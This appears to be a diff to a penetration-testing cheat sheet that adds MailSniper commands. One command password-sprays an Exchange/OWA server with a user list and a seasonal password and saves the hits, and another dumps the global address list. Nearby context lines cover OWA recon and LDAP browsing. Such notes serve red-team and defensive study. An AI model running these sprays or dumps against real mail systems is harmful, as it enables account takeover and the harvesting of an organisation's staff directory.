@@ -25,6 +25,13 @@ This will show the internal domain name.
 atomizer.py owa 'https://webmail.acme.com/Autodiscover' --recon
 ---------------------------------------------------------------------------------------------------------------------
 
+# MailSniper
+
+Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList C:\users.txt -Password Fall2021! -OutFile .\creds.txt
+
+GetGlobalAddressList -ExchHostname mail.target.com -UserName domain\user -Password Fall2021! -OutFile .\GAL.txt
+---------------------------------------------------------------------------------------------------------------------
+
 # Apache Directory Studio, using valid creds, port 636
 
 File > New > LDAP Browser > LDAP Connection > Next
